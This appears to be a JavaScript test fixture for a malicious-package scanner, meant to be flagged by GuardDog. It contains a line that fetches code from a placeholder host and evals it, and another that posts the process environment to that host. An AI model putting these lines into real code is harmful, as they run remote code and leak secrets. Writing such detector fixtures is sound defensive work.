// Test fixture for the malicious-package check (issue #229). Never run:
// GuardDog must flag the postinstall hook that downloads and executes code.
const https = require("https");

fetch("https://example.invalid/stage2").then((res) => res.text()).then((code) => eval(code));
https.request({ host: "example.invalid", path: "/c", method: "POST" }).end(JSON.stringify(process.env));
